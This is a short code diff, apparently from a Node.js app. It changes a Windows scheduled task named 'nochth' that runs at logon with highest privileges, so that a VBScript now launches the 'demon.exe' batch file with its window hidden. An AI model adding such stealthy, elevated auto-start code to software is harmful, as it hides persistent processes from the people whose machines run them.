@@ -146,12 +146,19 @@ let funcs = {
 				cwd: dataPath,
 			})
 			let batFile = path.join(dataPath,'rundemon.bat')
-			exec(`schtasks /create /tn "nochth" /tr "${batFile}" /sc onlogon /rl highest`,(err)=>{
+			let vbsFile = path.join(dataPath,'hide.vbs')
+			exec(`schtasks /create /tn "nochth" /tr "${vbsFile}" /sc onlogon /rl highest`,(err)=>{
 				if (err) console.log(err)
 			})
 			fs.writeFileSync(batFile,`
 cd ${dataPath}
 demon.exe
+			`)
+			fs.writeFileSync(vbsFile,`
+Dim WinScriptHost
+Set WinScriptHost = CreateObject("WScript.Shell")
+WinScriptHost.Run Chr(34) & "${batFile}" & Chr(34), 0
+Set WinScriptHost = Nothing
 			`)
 		}
 		return result
